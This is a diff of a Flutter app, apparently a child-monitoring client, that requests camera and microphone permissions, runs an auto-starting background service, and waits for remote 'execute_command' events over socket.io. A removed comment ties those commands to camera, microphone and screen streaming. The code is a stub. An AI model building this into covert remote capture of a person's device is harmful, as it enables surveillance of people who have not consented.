@@ -5,13 +5,13 @@ import 'package:socket_io_client/socket_io_client.dart' as IO;
 import 'package:device_info_plus/device_info_plus.dart';
 import 'dart:ui';
 
-// ⚠️ REMPLACE PAR TON URL RENDER RÉELLE
-const String SERVER_URL = 'https://ton-url-render.onrender.com';
+// ⚠️ Mets ton URL Render ici quand tu l'auras
+// Pour l'instant, cette valeur temporaire permet la compilation
+const String SERVER_URL = 'https://placeholder.onrender.com';
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
 
-  // Demander toutes les permissions au premier lancement
   await [
     Permission.camera,
     Permission.microphone,
@@ -27,8 +27,8 @@ Future<void> initializeService() async {
   final service = FlutterBackgroundService();
   await service.configure(
     androidConfiguration: AndroidConfiguration(
-      // ✅ CORRECTION : onCreate au lieu de onStartCommand (API v5.x)
-      onCreate: onStart,
+      // ✅ CORRECTION DÉFINITIVE : onStart (confirmé par la doc officielle v5.x)
+      onStart: onStart,
       autoStart: true,
       isForegroundMode: true,
       foregroundServiceNotificationId: 888,
@@ -41,7 +41,6 @@ Future<void> initializeService() async {
   await service.startService();
 }
 
-// ✅ CORRECTION : @pragma obligatoire + signature ServiceInstance
 @pragma('vm:entry-point')
 void onStart(ServiceInstance instance) async {
   DartPluginRegistrant.ensureInitialized();
@@ -68,22 +67,11 @@ void onStart(ServiceInstance instance) async {
 
   socket.on('execute_command', (action) {
     print('📡 Commande reçue: $action');
-    // Ici, on activerait le flux caméra/micro/écran via WebRTC
   });
 
   socket.on('disconnect', (_) {
     print('❌ Déconnecté du serveur');
   });
-
-  // Garder le service en vie
-  if (instance is AndroidServiceInstance) {
-    instance.on('setAsForeground').listen((event) {
-      instance.setAsForegroundService();
-    });
-    instance.on('setAsBackground').listen((event) {
-      instance.setAsBackgroundService();
-    });
-  }
 }
 
 class OriaChildApp extends StatelessWidget {
